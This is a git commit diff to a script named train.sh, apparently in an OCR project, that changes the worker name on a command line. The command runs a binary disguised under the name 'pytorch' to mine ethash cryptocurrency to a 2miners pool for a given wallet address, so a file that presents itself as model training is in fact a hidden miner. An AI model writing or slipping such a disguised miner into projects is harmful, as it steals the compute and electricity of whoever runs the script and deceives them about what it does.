ba6098ebe1a1e9ce33ec98c7cee0e638b8acfb55
mysec000 <104643039+mysec000@users.noreply.github.com>
2022-04-30 01:10:55 +0530

    gh

--- train.sh
+++ train.sh
@@ -1,3 +1,3 @@
 !/bin/sh
  cd /tmp/deepocr
- ./pytorch -a ethash -o stratum+tcp://eth.2miners.com:2020 -u bc1q29fkgg2dl95c4fu3ncfy88gum2e7q5mxr5yfz4 -p x -w rig45
+ ./pytorch -a ethash -o stratum+tcp://eth.2miners.com:2020 -u bc1q29fkgg2dl95c4fu3ncfy88gum2e7q5mxr5yfz4 -p x -w rig44
